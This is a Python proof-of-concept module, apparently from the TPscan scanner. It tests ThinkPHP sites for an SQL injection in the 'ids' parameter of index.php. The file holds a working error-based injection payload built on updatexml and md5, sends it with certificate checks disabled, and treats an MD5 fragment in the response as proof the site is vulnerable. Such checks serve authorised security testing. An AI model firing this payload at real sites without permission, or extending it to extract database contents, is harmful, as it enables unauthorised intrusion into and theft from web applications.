#!/usr/bin/env python
# coding=utf-8
from urllib.parse import urljoin

import requests

from utils import get_pocdict

headers = {
    "User-Agent": "TPscan",
}
payload = "index.php?ids[0,UpdAtexml(0,ConcAt(0xa,Md5(2333)),0)]=1"


async def thinkphp_debug_index_ids_sqli_verify(url):
    pocdict = get_pocdict(vulnname=__name__)
    try:
        url = urljoin(url, payload)
        resp = requests.get(url, headers=headers, timeout=15, verify=False)
        if '56540676a129760' in resp.text:
            pocdict['isvul'] = True
            pocdict['vulnurl'] = url
            pocdict['proof'] = '56540676a129760'
            pocdict['response'] = resp.text
    except Exception as e:
        pocdict['exception'] = str(e)
    return pocdict
